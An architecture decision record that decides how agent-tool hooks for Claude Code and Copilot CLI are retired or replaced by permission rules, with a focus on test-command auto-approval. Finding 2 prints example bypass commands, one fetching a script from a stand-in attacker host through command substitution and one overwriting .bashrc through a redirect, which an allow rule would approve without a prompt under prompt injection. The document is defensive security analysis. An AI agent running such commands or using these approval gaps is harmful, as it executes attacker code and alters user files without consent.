---
# taste-lint: ignore file-size, accepted append-only record; splitting breaks audit continuity.
id: ADR-085
status: accepted
date: 2026-07-31
decision-makers: [rjmurillo]
supersedes: []
superseded-by: null
explainer: null
implemented: true
---

# ADR-085: Cross-Harness Permission-Surface Asymmetry and Hook Survivor Disposition

## Status

Accepted (2026-07-20). Requested by issue #3217 as part of the issue #3197
vendored-hook ROI review. The initial adr-review reached consensus with 5 Accept
plus 1 Disagree-and-Commit. Its historical record is
`.agents/analysis/ADR-085-permission-surface-debate.md`. The superseding
security-amendment review reached consensus with 5 Accept plus 1
Disagree-and-Commit and no unresolved P0. Its record is
`.agents/critique/ADR-085-debate-log.md`. The owner initially ratified D-A as
internal-only and D-B as keep-as-hook.

A later security-policy review established Finding 3: a test-runner command name
cannot prove the executed repository code is safe. After reviewing the direct
conflict with the accepted ADR, the owner explicitly superseded D-B and chose
deletion. D-A remains internal-only. The D-B removal is implemented by
`fix/copilot-hook-contract`. PR #3293 selected D-A's Retirement terminal state
and removed the guard source, registrations, generated artifacts, and dedicated
tests. On 2026-07-22 the owner chose to remove `observation_sync` from the
vendored plugin while retaining the local repository hook. Issue #3217 closed
on 2026-07-28 after confirming `observation_sync` is absent from plugin
registrations and vendored trees, while a Git-hook or CI re-home cannot observe
its MCP event. Issue #3218 closed the same day after confirming the remaining
dispatcher machinery serves live generation paths. The decision's terminal
states are implemented. On 2026-08-11 issue #4874 added the
`require_subagent_model` registration to the vendored inventory; section 6 and
the repo-local `.github/hooks` surface note were updated in the same review
(debate log `.agents/critique/ADR-068-071-085-metric-refresh-debate-log.md`). Sources:
<https://github.com/rjmurillo/ai-agents/issues/3217> and
<https://github.com/rjmurillo/ai-agents/issues/3218>.

## Amendment Record

PR #3259 replaced the repository's custom Git-hook framework with Lefthook. The
D-A implementation contract now names `lefthook.yml` and CI only for policy they
can observe after a Git or workflow event. Neither surface can preserve
PreToolUse timing or block an arbitrary raw command before execution. The later
security amendment supersedes D-B with deletion; it does not undo this D-A
framework correction.
PR #3293 later implemented D-A as explicit Retirement. It removed the
PreToolUse carrier instead of claiming Lefthook or CI preserved agent-time
blocking.

The 2026-07-31 factual amendment corrected stale #3217 and #3218 ownership
claims. A six-role adr-review accepted the correction. The amendment changed no
runtime behavior or accepted design outcome. It records that both issues are
closed and that future component retirement requires a new architecture
decision.

## Date

2026-07-20; amended 2026-07-31 and 2026-08-11

## Context

Issue #3197 authorized shrinking the vendored hook surface the project ships to
consumers. ADR-062 (amended, #3214) retired the LSP-first enforcement family.
ADR-084 (#3215) set the ROI bar that stops the surface re-accreting. Issue #3216
purged non-customer hooks. A small set of survivor hooks remain.

Issue #3217 proposed the next step: move the survivors off hooks and onto
host-native permissions (`permissions.deny`, `permissions.allow`). Its stated
premise was that host-native permissions are "portable across Claude and Copilot
with no dual-surface machinery." Verification falsified that migration premise on
two independent axes, then found a deeper safety defect in the auto-approval goal.

Three survivor hooks were named in #3217 when this ADR began:

- Retired `invoke_skill_first_guard.py` (PreToolUse). It blocked a raw `gh` call when a
  validated skill script existed for that operation. It shipped to Copilot but
  self-neutered outside this repository. PR #3293 selected Retirement and
  removed the source, registrations, generated artifacts, and dedicated tests.
  It was a policy and developer-experience control, not a security boundary.
- Retired `invoke_test_auto_approval.py` (PermissionRequest). Auto-approved a fixed set
  of test-runner commands to cut permission fatigue. It was Claude-only when this
  ADR started. The hook-contract branch briefly generated a Copilot translation,
  then removed both registrations after Finding 3.
- `invoke_observation_sync.py` (PostToolUse). Syncs this repo's internal Serena
  and Forgetful memories. It had no documented plugin-consumer contract. The
  2026-07-22 owner decision removes it from the vendored Copilot surface and
  retains it only in local repository settings.

### Finding 1: Copilot has no repo-committed permission surface, and the guard self-neutered before retirement

GitHub documents session flags and user-level persisted approvals for Copilot CLI.
It documents no repo-committed, fine-grained permission file comparable to
Claude's `.claude/settings.json` `permissions` block. An isolated Copilot CLI
1.0.72-1 help probe found no additional configuration key. The evidence is
recorded in `agent-harness-reference`, not left as an unreproducible negative
claim.

The gap is tracked upstream by the open feature request "Permission Profiles:
named, switchable permission presets (global + per-repo)"
(`github/copilot-cli#3176`). It proposes a committed
`.github/copilot-permissions.json` with `denyTools`, under the permissions epic
`github/copilot-cli#316`; related `github/copilot-cli#2398` requests a default
permissions config file. If Copilot ships a committed permission surface, the
asymmetry closes and this finding should be revisited.

| Harness | Surface | Repo-committed | Fine-grained | Ships with plugin |
|---------|---------|----------------|--------------|-------------------|
| Claude Code | `.claude/settings.json` `permissions.allow`/`deny`, e.g. `Bash(gh pr create:*)` | Yes | Yes, by command pattern | Yes |
| Copilot CLI | Session flags `--allow-tool 'shell(git:*)'` / `--deny-tool` | No | Per-invocation only | No |
| Copilot CLI | `~/.copilot/permissions-config.json` | No, user-global | No, coarse kinds (`write`) keyed by absolute path | No |
| Copilot CLI | `copilot config` | No command rules | No | No |

Migrating `skill_first_guard` to a Claude `permissions.deny` entry would have expressed
the guard for Claude and silently drop it for every Copilot consumer, because no
committed Copilot surface can carry the rule.

There was a second, decisive fact about the guard's behavior before PR #3293.
Its `main()` called `skip_if_consumer_repo("skill-first-guard")` and returned
immediately when true. That helper
(`.claude/lib/hook_utilities/guards.py`) returns true whenever the git origin is
not `ai-agents` (or is unknown and uncorroborated by `pyproject` name). So the
guard enforced only inside the `ai-agents` repo itself. In any consumer repo,
Claude or Copilot, it loaded, checked the guard, and no-oped.

The consequence was that the guard shipped to Copilot but protected no
consumer. That made its disposition an owner-intent question, not a mechanical
one (see D-A). The `github` skill scripts it pointed at still ship to consumers
(`src/copilot-cli/skills/github/scripts/`), which is evidence the guard was meant
to be customer-facing, but the `skip_if_consumer_repo` gate (added #1194,
2026-02-20) contradicts that intent.

### Finding 2: Claude allow-rules do not screen the metacharacters the test hook rejects

The previously registered `invoke_test_auto_approval.py` was not a pure static allowlist. Before matching a
runner pattern it rejects any command containing a shell metacharacter: `;`, `|`,
`&`, `<`, `>`, `$`, backtick, newline, or carriage return
(`DANGEROUS_METACHARACTERS`, lines 22-32). It anchors each pattern to the start of
the command and closed a prior bypass where `python evil.py pytest` auto-approved
because `pytest` appeared anywhere in argv (lines 42-47). It is an injection guard
on an auto-approve path.

Claude Code `permissions.allow` matching (v2.1.x) is aware of shell separators. A
rule like `Bash(pytest *)` will not auto-approve `pytest && other-cmd`, because
Claude splits on the recognized separators (`&&`, `||`, `;`, `|`, `|&`, `&`, and
newlines) and requires each subcommand to match a rule. This fixes the
command-chaining bypass class tracked upstream in anthropics/claude-code#4956.

That separator set does not include command substitution (`$(...)`, backticks) or
redirects (`<`, `>`). Those are not separators, so they do not split the command.
A rule like `Bash(pytest *)` therefore matches, and auto-approves, both of these:

- `pytest $(curl https://evil.example/x.sh)` (command substitution, no inner
  separator), which executes the substitution.
- `pytest > /home/user/.bashrc` (output redirect), which overwrites the file.

The hook rejects both (`$` and `>` are screened). Migrating `test_auto_approval`
to `permissions.allow` would widen what auto-approves without a prompt to include
command-substitution and redirect forms the hook blocks today. On an auto-approve
path, under an autopilot or prompt-injection threat model, that is a security
regression, not a neutral refactor. Risk score 7/10: command execution or file
overwrite with no confirmation prompt, reachable by prompt-injected agent input
(CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N).

No `permissions.deny` companion cleanly closes the gap. The decisive reason is
scope: a deny rule applies to every command, not only the allow path that carries
the risk, so a global `Bash(*$*)`-style deny would also block legitimate
interactive `pytest` invocations that contain `$`, even ones the user approves by
hand. A secondary reason is expressiveness: deny rules are prefix and glob, and
`$` escaping in Claude's glob engine is undocumented, so a rule scoped to "pytest
containing `$`" cannot be written with confidence. The hook's screen is also not
total: it rejects `$` and backtick but not tilde (`~`) or brace (`{a,b}`)
expansion, a lower-severity path gap (risk 3/10) that migration would not change
either way.

### Finding 3: A runner name is not a trust boundary

This finding was discovered during the later security-policy review, after the
initial review and owner ratification kept D-B. It triggered the superseding
deletion decision. Findings 1 and 2 were available before that first decision.

Finding 2 compares two auto-approval carriers. It does not establish that either
carrier is safe. An exact `pytest`, Pester, or package-test command still executes
repository-controlled code. Test collection imports modules and fixtures. Plugins
and configuration can run code before a test body. Package-manager test commands
run repository-defined scripts. Runner options can also select external paths or
destructive behavior.

The prior hook screened shell metacharacters and tightened command-prefix matching.
Those checks reduce shell-syntax bypasses. They do not prove the code selected by
the runner is safe. Under a prompt-injection or untrusted-repository threat model,
auto-approving the runner grants unprompted user-level code execution.

Safety-audit findings 19 and 48 record the producer's command-pattern and
input-shape defects. The full-context security review at
`.serena/memories/reviews/fix-copilot-hook-contract-213f3af.md` records the deeper
repository-code issue. The protected assets are the developer workstation,
repository state, credentials available to the process, and the user's approval
decision.

## Decision

### 1. General eligibility test for hook-to-permissions migration

A vendored guard hook may be replaced by host-native permissions only when all
three hold:

1. **Portability.** An equivalent repo-committed, shippable permission surface
   exists on every harness the hook targets. A hook that ships to Copilot fails
   this until Copilot gains a committed permission surface. Session flags,
   user-global config, and wrapper arguments do not qualify.
2. **Fidelity.** The hook carries no parsing or injection semantics the
   permission surface cannot replicate. A hook that screens command substitution,
   backticks, or redirects on an auto-approve or auto-deny path fails this on
   Claude today, because `permissions.allow` splits on separators only.
3. **Policy safety.** The underlying allow or deny policy establishes a real
   safety boundary. A process or runner name alone does not prove that the code
   it loads, discovers, imports, or executes is safe. Portability and fidelity
   are necessary but cannot legalize an unsafe policy.

### 2. `skill_first_guard`: remove it from the vendored surface; preserve only enforceable policy (D-A)

Do not migrate `skill_first_guard` to a Claude `permissions.deny` rule. It fails
portability (ships to Copilot, no committed Copilot surface). A permissions rule
also cannot express the guard's conditional logic ("deny raw `gh X` only when a
skill exists") or its instructional block message.

Rejecting a permissions migration does not require preserving a hook. It means a
declarative deny rule is not an equivalent replacement. The current shipped-dead
state, self-neuter via `skip_if_consumer_repo` on a hook shipped to Copilot, is a
direct ADR-084 rule 4 violation. Leaving D-A unresolved is not a valid end state.

**Resolution (owner, 2026-07-20): internal-only.** `skill_first_guard` is
dogfood-only developer experience, not customer-facing. Stop shipping it on the
vendored surface. This differs from the adr-review recommendation
(customer-facing), and the owner ruled under User Sovereignty. #3218 rescopes to
retire machinery whose last consumer this removal eliminates.

This scope decision does not claim a behavior-preserving relocation. Lefthook and
CI receive Git or workflow events, not the PreToolUse payload, and cannot block a
raw `gh` command before it executes. The #3217 implementation contract required:

1. Remove the guard from the vendored surface and generated registrations.
2. Name any repository-state invariant that remains enforceable through
   `lefthook.yml` or CI, including its trigger, failure behavior, and acceptance
   test.
3. Record retirement of pre-execution blocking unless a separate decision
   approves a non-vendored agent-time carrier.

The D-A portion of #3217 may reach completion only in one of two terminal
states:

1. **Repository-only agent-time carrier.** A separate decision approves a
   non-vendored PreToolUse carrier. Build and artifact tests prove the guard is
   absent from both plugin manifests and the generated `src/copilot-cli` tree.
   A live repository test proves matching raw `gh` calls are blocked and allowed
   skill invocations still pass.
2. **Retirement.** The guard source, registrations, and dedicated tests are
   removed. Repository instructions state that skill-first behavior is static
   guidance only, with Lefthook and CI covering only state they can observe.

A move to Lefthook or CI that claims raw-command equivalence satisfies neither
terminal state. For this guard, ADR-084 rule 4 applies only when Git or workflow
state exposes an enforceable invariant. When none exists, explicit retirement
satisfies the rule's non-vendoring purpose.

PR #3293 selected terminal state 2, Retirement. It removed the guard source,
all registrations, generated Copilot artifacts, and dedicated tests. Repository
instructions retain skill-first as a static MUST-level rule. No Lefthook or CI
surface claims equivalent pre-execution interception. That completes D-A. The 2026-07-22 owner decision also closes the remaining
`observation_sync` disposition by removing its vendored registration.

### 3. `test_auto_approval`: delete the auto-approval path (D-B superseded)

Delete `test_auto_approval`, its Claude registrations, its generated Copilot
artifacts, and its producer-specific tests. Do not replace it with
`permissions.allow`. Finding 2 rejects migration because the declarative surface
loses metacharacter screening. Finding 3 rejects keeping the hook because the
screened runner still executes repository-controlled code without a prompt.

Retain the generic PermissionRequest translation adapter and its synthetic tests.
The adapter is inert without a registered producer and preserves a reviewed
cross-harness capability for a future policy that establishes a real safety
boundary. Any future producer requires a new security review, positive, negative,
edge, and destructive-option tests, plus a fresh host-contract probe.

The owner initially ratified D-B as keep-as-hook. After the deeper security finding
and an explicit reconciliation against the accepted ADR, the owner superseded that
decision and chose deletion. Normal host permission handling now remains
authoritative for test execution.

### 4. `observation_sync`: remove from the vendored surface

It makes no permission decision, so it is not a permissions candidate. As a
PostToolUse hook it fires after tool execution; permissions gate only before
execution, so no permission rule can carry its behavior. It syncs this repo's
internal Serena and Forgetful stores. The installed plugin previously executed a repository-controlled importer
after checking only the repository basename. A different repository named
`ai-agents` could satisfy that identity check. The owner chose removal from the vendored source. Local `.claude/settings.json`
retains the hook for this repository. Issue #3217 closed on 2026-07-28 after
confirming the customer-facing intent is already met: the hook is absent from
plugin registrations and vendored trees, and a Git-hook or CI re-home cannot
observe the MCP event.

### 5. Component-level machinery disposition

Issue #3218 closed on 2026-07-28 after verification showed its retirement
premise was wrong. `_expand_dispatch_groups` and `event_matcher_union` remain
live generation paths, while parity tests cover generated surfaces. A
surviving hook retains only the components it uses. The dispatcher may be
removed or replaced by direct host registrations while hooks remain, but that
change requires a new architecture decision. A future permission surface can
replace only eligible pre-execution policy hooks; it cannot carry PostToolUse
observers. A component may retire when it has zero active consumers or when a
tested replacement preserves its host contract.

### 6. Confirmation

The eligibility test (Decision 1) is applied at adr-review time for any future
hook-to-permissions migration proposal. ADR-084 rule 5's vendored-hook presence
check is planned but not built; human ADR and PR review is the current gate. Decision 5 is confirmed done when both hold: every
dispatcher, translation-adapter, parity, and drift component whose last
surviving hook consumer is gone is either removed or retained by a named
accepted decision with dedicated tests; and each component still referenced by
a surviving vendored hook is listed with the hook that keeps it alive. Decision
3 is the named retention decision for the dormant generic PermissionRequest
adapter. Removing that adapter requires superseding this decision, not treating
zero active producers as implicit approval. The vendored source has five registrations across two events:
`markdownlint_guard`, `push_pr_script_identity_guard`,
`require_subagent_model`, and `markdown_auto_lint`. Copilot generation emits two host registrations. This repository also
registers the require-subagent-model gate directly at
`.github/hooks/require-subagent-model.json` for local Copilot runs; cloud
agent reads only default-branch `.github/hooks/*.json`, so cloud coverage
begins at merge. That surface is repository-local and outside the plugin
inventory. On the Claude side this repository carries no `settings.json` twin:
the duplicate-entry contract forbids one, and gate-mode groups skip the
dispatcher self-host bail, so in-repo Claude enforcement arrives through the
installed plugin as it updates. #3218
closed after deriving its consumer list from active source registrations and
generated manifests. Any future retirement or replacement requires reference
search, regeneration, and artifact tests that prove no active consumer lost
its required behavior.

The current dispatcher state is not permanent debt accepted by documentation.
Each retained component must record why direct registration or deletion would
lose a measured host contract or cost more than the retained machinery.
Simplification requires a new architecture decision.

## Resolved Owner Decisions

### D-A: Is `skill_first_guard` customer-facing or internal?

- **Recommendation: customer-facing.** The `github` skill scripts it enforces ship
  to consumers; a guard that steers agents to those scripts has consumer value.
  If customer-facing: keep the hook on both harnesses, remove
  `skip_if_consumer_repo` from this guard, and make skill discovery plugin-root
  aware (`COPILOT_PLUGIN_ROOT`/`CLAUDE_PLUGIN_ROOT`) so it resolves shipped scripts
  in a consumer repo. This alternative was not selected.
- **Alternative: internal-only.** If the owner intends it as dogfood-only DX, then
  per ADR-084 rule 4, stop shipping it on the vendored Copilot surface. Use a
  repository-only PreToolUse carrier if real-time interception remains required.
  Otherwise retire real-time enforcement and keep only static instructions plus
  git-hook and CI checks for behavior those surfaces can observe.

Either way the `skip_if_consumer_repo` no-op-in-place state is not a valid
end state for a shipped hook.

**Resolved (owner, 2026-07-20): internal-only.** Stop shipping
`skill_first_guard` on the vendored surface. PR #3293 selected Retirement and
met the Decision 2 completion contract by removing the source, registrations,
generated artifacts, and dedicated tests while retaining static instructions.

### D-B: Keep, migrate, or delete `test_auto_approval`?

- **Alternative: keep as a hook.** Finding 2 shows this preserves metacharacter
  screening. Finding 3 shows it still approves repository-controlled code.
- **Alternative: migrate to `permissions.allow`.** Removes one hook and its
  dispatch group. Accepts that `pytest $(...)`, backtick, and redirect forms
  auto-approve without a prompt and retains the Finding 3 trust flaw.
- **Recommendation: delete the auto-approval outright.** Removes the hook and the
  auto-approve path entirely. No fidelity gap, no dispatch group, smallest surface,
  most aligned with the #3197 shrink mandate. Cost: one extra permission prompt per
  test run for this repo's own developers.

**Initial resolution (owner, 2026-07-20): keep as a hook.**

**Superseding resolution (owner, 2026-07-20): delete.** The later decision rests
on Finding 3, which the initial metacharacter-focused review did not model. Remove
the auto-approval path from both harness policies and accept normal permission
prompts.

## Prior Art Investigation

### What Currently Exists

- The Python `skill_first_guard` entered via #1165 (2026-02-14), migrated from an
  earlier PowerShell form (#1065). The `skip_if_consumer_repo` gate was added in
  #1194 (2026-02-20). PR #3293 retired the guard under Decision 2 terminal state
  2. Verified via `git log` this session.
- Before this amendment, `test_auto_approval` was registered as a Claude
  PermissionRequest hook and generated into the Copilot plugin tree. The
  implementing branch removes the producer, registrations, generated event
  directory, and producer-specific tests.
- Copilot hook generation (ADR-068) and Claude group dispatch (ADR-082) build the
  `src/copilot-cli/hooks/` tree from the canonical `.claude/hooks/` source.

### Historical Rationale

The skill-first guard prevents agents bypassing tested GitHub workflows with raw
`gh`. `test_auto_approval` used a hook because the repo did not use Claude
permission declarations; the host feature now expresses allowlists natively, which
is what prompted the #3217 migration proposal.

### Why Change Now

Epic #3197 set a cost bar for vendored hooks. #3217 assumed permissions were a
drop-in replacement. Verification shows they are not, for these survivors: Copilot
has no committed surface (Finding 1) and Claude allow-rules under-screen an
auto-approve path (Finding 2). Security review then showed that both carriers share
the deeper runner-name trust flaw (Finding 3). Recording all three findings stops
future work from re-proposing migration or auto-approval without re-establishing a
real safety boundary.

## Rationale

### Alternatives Considered

| Alternative | Pros | Cons | Why Not Chosen |
|-------------|------|------|----------------|
| Migrate both guards to permissions (the #3217 plan) | Retires two hooks; enables more of #3218 | Strips `skill_first_guard` from Copilot; widens `test_auto_approval` auto-approve to `$(...)`/redirects | Fails both criteria; ships a security regression |
| Migrate `test_auto_approval` only (Claude-only, Sol draft) | Removes one hook + dispatch group | Auto-approve fidelity gap remains on Claude | Narrow but real auto-approve regression; not worth one fewer hook |
| Delete `test_auto_approval` outright (no auto-approve) | Removes the hook, dispatch group, fidelity gap, and runner-name trust flaw | One extra permission prompt per test run for this repo's developers | Chosen after Finding 3 |
| Dual-surface: hook on Copilot, permissions on Claude | Uses native surface where it exists | Reintroduces the per-harness divergence #3218 wants gone | Adds machinery to remove machinery |
| Keep `test_auto_approval` as a hook | Preserves metacharacter screening and reduces prompts | Exact runner commands still execute repository-controlled code without consent | Rejected after Finding 3 |
| Remove `skill_first_guard` from the vendored surface and delete `test_auto_approval` | Removes a dead consumer hook and an unsafe approval path | Retires skill-first pre-execution blocking unless a separate carrier is approved | Chosen owner combination |

### Trade-offs

Deletion costs a permission prompt when a test command lacks prior user approval.
That bounded friction preserves the user decision before repository-controlled code
runs. Neither a hook nor `permissions.allow` can turn the runner name into a safety
boundary. D-A also loses pre-execution skill-first blocking unless a separate
repository-only carrier is approved; Lefthook and CI cannot preserve that timing.

## Consequences

### Positive

- PR #3293 removed the self-neutering `skill_first_guard` from source and
  vendored surfaces.
- Any repository-state policy retained from D-A has an explicit Lefthook or CI
  trigger and does not claim raw-command equivalence.
- No test-runner auto-approve path remains in either harness policy.
- The generic PermissionRequest adapter remains available without an active
  producer or runtime permission effect.
- One written eligibility test stops the next ROI pass re-proposing a portable,
  faithful, but unsafe migration.

### Negative

- #3218 closed on 2026-07-28 without component removal. Current hook survival
  does not by itself require consolidated dispatch. Simplification requires a
  new architecture decision.
- D-A Retirement removes `skill_first_guard`'s pre-execution block. Lefthook
  and CI do not preserve that timing.
- The retained-consumer inventory must include ADR-083 security controls and
  every other surviving hook.
- Test commands now use normal host permission handling. Developers may see one
  extra prompt per runner invocation.
- Copilot consumers and this repository no longer get runtime skill-first
  interception. Static skill-first instructions remain. Reintroduction is a
  fresh proposal against the eligibility test.

### Neutral

- `observation_sync` remains local-only under the closed #3217 disposition.
- The eligibility test remains falsifiable for other hook migrations. A committed
  Copilot permission surface can reopen `skill_first_guard` portability.
- Better shell matching does not reopen test-runner auto-approval. Reintroduction
  requires a new policy that addresses repository-controlled code, not only command
  syntax.
- The initial review's 2027-01-20 fallback applied to a kept approval hook. The
  superseding deletion retires that timer. Reintroduction requires a new ADR and
  security review instead of a scheduled keep review.

## Impact on Dependent Components

| Component | Dependency Type | Required Update | Risk |
|-----------|-----------------|-----------------|------|
| Issue #3217 | Historical | Closed on 2026-07-28 after confirming D-A Retirement, D-B deletion, and the local-only `observation_sync` disposition | Medium |
| Issue #3218 | Historical | Closed on 2026-07-28 after confirming the named components remain live; future simplification requires a new architecture decision | Low |
| Historical `.claude/hooks/PreToolUse/invoke_skill_first_guard.py` | Direct | Removed by PR #3293 under the Retirement terminal state | High |
| `.claude/settings.json`, `.claude/hooks/hooks.json`, `.claude/hooks/dispatch_groups.json` | Direct | `test_auto_approval` and `skill_first_guard` registrations are removed | High |
| Removed `.claude/hooks/PermissionRequest/invoke_test_auto_approval.py` | Direct | Delete the producer and its dedicated tests | High |
| `src/copilot-cli/hooks/PermissionRequest/` | Generated | Remove through regeneration and prove the event directory stays absent | High |
| `src/copilot-cli/hooks/PreToolUse/invoke_skill_first_guard__*.py` | Generated | Removed from the vendored surface under #3217 (stops shipping) | Medium |

## Implementation Notes

The initial ADR changed no code. The `fix/copilot-hook-contract` implementation
applies superseding D-B: delete `test_auto_approval`, remove both registration
surfaces, regenerate the Copilot tree, retain the generic adapter, and add absence
regressions. PR #3293 applies D-A Retirement: delete `skill_first_guard`, its
registrations, generated artifacts, and dedicated tests. Issue #3218 closed on
2026-07-28 without component retirement. Issue #3217 closed the same day after
confirming `observation_sync` already meets the customer-facing intent and
cannot move to Git hooks or CI without losing its MCP event. Any future
retirement or replacement requires a new architecture decision.

## Related Decisions

- ADR-062 (amended, #3214): retired LSP enforcement, kept static steering.
  Precedent for dropping an expensive carrier. This ADR also rejects an
  unfaithful carrier: D-A retires one guard, while D-B deletes the unsafe
  approval goal.
- ADR-084 (#3215): the vendored-hook ROI bar and the no-self-neuter rule that D-A
  applies.
- ADR-086 and PR #3259: Lefthook is the sole Git-hook scheduler; it does not
  replace agent-time PreToolUse enforcement.
- ADR-083 (#3222): the dogfood mandate that makes Finding 2 blocking.
- ADR-068: the generic PermissionRequest adapter and the active-policy removal.
- ADR-082: the dispatcher machinery whose simplification is bounded by
  surviving hooks. Issue #3218 no longer owns that scope.

## References

- Issues #3197, #3217, #3218, #3216, #3219.
- Claude Code permissions, "Compound commands": <https://code.claude.com/docs/en/permissions>.
- anthropics/claude-code#4956: Bash permission bypass via command chaining.
- PR #3293, commit `8f391b3c67a7ea85e279d036f07e8a4c1a92a243`,
  preserves the retirement rationale and the historical self-neuter evidence;
  `.claude/lib/hook_utilities/guards.py` retains `skip_if_consumer_repo`.
- `.agents/audits/2026-07-02-safety-audit.md`, findings 19 and 48.
- `.serena/memories/reviews/fix-copilot-hook-contract-213f3af.md`, full-context
  CRITICAL_FAIL security review.
- `tests/build_scripts/test_copilot_dispatcher_artifact.py`, absence regressions.
- `.claude/skills/agent-harness-reference/references/official-hook-contracts.md`,
  Permission controls.
- `.claude/skills/agent-harness-reference/references/probe-evidence.md`,
  Permission-surface inventory.
